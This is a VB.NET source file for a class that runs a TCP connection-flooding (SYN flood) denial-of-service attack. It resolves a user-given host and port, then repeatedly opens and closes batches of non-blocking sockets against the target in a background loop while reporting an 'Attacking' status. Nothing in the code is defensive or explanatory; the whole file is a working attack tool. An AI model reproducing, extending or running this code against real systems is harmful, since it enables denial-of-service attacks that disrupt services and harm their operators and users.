﻿Imports System.Net
Imports System.Threading
Imports System.Net.Sockets
Imports System.ComponentModel

Public Class SYN
    Public Enum Status
        Attacking = 1
        Stopped = 2
    End Enum

    Friend Shared WithEvents bgFlood As New BackgroundWorker
    Friend Shared Host As String
    Friend Shared Port As Integer
    Friend Shared Sockets As Integer
    Friend Shared Timeout As Integer = 500
    Friend Shared KeepFlooding As Boolean = False

    Friend Shared Sub Flood(ByVal s As Object, ByVal e As DoWorkEventArgs) Handles bgFlood.DoWork
        Dim _ipEp As IPEndPoint
        Try
            Dim addressList As IPAddress() = Dns.GetHostEntry(Host).AddressList
            _ipEp = New IPEndPoint(addressList(0), Port)
        Catch
            Dim address As IPAddress = IPAddress.Parse(Host)
            _ipEp = New IPEndPoint(address, Port)
        End Try
        Dim NewSyn As New SendSyn(_ipEp, Sockets)
        bgFlood.ReportProgress(Status.Attacking)
        Do While KeepFlooding = True
            NewSyn.Send()
            Thread.Sleep(Timeout)
        Loop
        bgFlood.ReportProgress(Status.Stopped)
    End Sub

    Friend Class SendSyn
        Private _sock As Socket()
        Private ipEo As IPEndPoint
        Private SuperSynSockets As Integer

        Friend Sub New(ByVal ipEo As IPEndPoint, ByVal superSynSockets__1 As Integer)
            Me.ipEo = ipEo
            SuperSynSockets = superSynSockets__1
        End Sub

        Friend Shared Sub OnConnect(ByVal ar As IAsyncResult)
        End Sub

        Friend Sub Send()
            While True
                Dim num As Integer
                Try
                    _sock = New Socket(SuperSynSockets - 1) {}
                    For num = 0 To SuperSynSockets - 1
                        If SYN.KeepFlooding = True Then
                            _sock(num) = New Socket(ipEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
                            _sock(num).Blocking = False
                            _sock(num).BeginConnect(ipEo, New System.AsyncCallback(AddressOf OnConnect), _sock(num))
                        Else
                            Exit Sub
                        End If
                    Next
                    Thread.Sleep(100)
                    For num = 0 To SuperSynSockets - 1
                        If SYN.KeepFlooding = True Then
                            If _sock(num).Connected Then
                                _sock(num).Disconnect(False)
                            End If
                            _sock(num).Close()
                            _sock(num) = Nothing
                        Else
                            Exit Sub
                        End If
                    Next
                    _sock = Nothing
                Catch
                    For num = 0 To SuperSynSockets - 1
                        If KeepFlooding = True Then
                            Try
                                If _sock IsNot Nothing Then
                                    If _sock(num).Connected Then
                                        _sock(num).Disconnect(False)
                                    End If
                                    _sock(num).Close()
                                    _sock(num) = Nothing
                                End If
                            Catch
                            End Try
                        Else
                            Exit Sub
                        End If
                    Next
                End Try
            End While
        End Sub
    End Class
End Class